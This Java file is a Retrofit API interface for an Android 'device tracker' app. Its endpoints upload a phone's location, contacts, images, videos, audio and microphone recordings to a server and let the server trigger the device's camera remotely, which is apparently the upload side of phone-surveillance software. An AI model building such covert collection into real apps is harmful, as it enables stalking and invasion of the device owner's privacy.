package com.example.devicetrackerapp.api;

import com.example.devicetrackerapp.dto.ApiResponse;
import com.example.devicetrackerapp.dto.ContactPayload;
import com.example.devicetrackerapp.dto.RegisterDeviceRequest;
import com.example.devicetrackerapp.dto.RegisterDeviceResponse;
import com.example.devicetrackerapp.dto.TrackingConfigResponse;
import com.example.devicetrackerapp.dto.UpdateLocationRequest;

import java.util.List;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.GET;
import retrofit2.http.Multipart;
import retrofit2.http.POST;
import retrofit2.http.Part;
import retrofit2.http.Path;

public interface ApiService {

    @POST("api/device/register")
    Call<ApiResponse<RegisterDeviceResponse>> registerDevice(
            @Body RegisterDeviceRequest request
    );

    @POST("api/device/update")
    Call<ApiResponse<String>> updateDevice(
            @Body UpdateLocationRequest request
    );

    @GET("api/device/tracking/config/{deviceId}")
    Call<ApiResponse<TrackingConfigResponse>>
    getTrackingConfig(
            @Path("deviceId") String deviceId);

    @POST("media/contact/save")
    Call<ApiResponse<String>> saveContacts(
            @Body ContactPayload payload
    );

    @Multipart
    @POST("media/image/upload")
    Call<String> uploadImages(
            @Part("deviceId") RequestBody deviceId,
            @Part List<MultipartBody.Part> files
    );

    @Multipart
    @POST("media/video/upload")
    Call<String> uploadVideos(

            @Part("deviceId")
            RequestBody deviceId,
            @Part
            List<MultipartBody.Part> files

    );

    @Multipart
    @POST("media/audio/upload")
    Call<String> uploadAudios(

            @Part("deviceId")
            RequestBody deviceId,

            @Part
            List<MultipartBody.Part> files

    );

    @Multipart
    @POST("media/mic/upload")
    Call<String> uploadMicRecording(

            @Part("deviceId")
            RequestBody deviceId,

            @Part("duration")
            RequestBody duration,

            @Part
            MultipartBody.Part file

    );

    @POST("media/camera/started/{deviceId}")
    Call<String> cameraStarted(
            @Path("deviceId")
            String deviceId);

    @POST("media/camera/stopped/{deviceId}")
    Call<String> cameraStopped(
            @Path("deviceId")
            String deviceId);

    @POST("media/camera/request/{deviceId}")
    Call<String> requestCamera(
            @Path("deviceId")
            String deviceId
    );

    @POST("/media/camera/request-received/{deviceId}")
    Call<String> cameraRequestReceived(
            @Path("deviceId") String deviceId
    );

}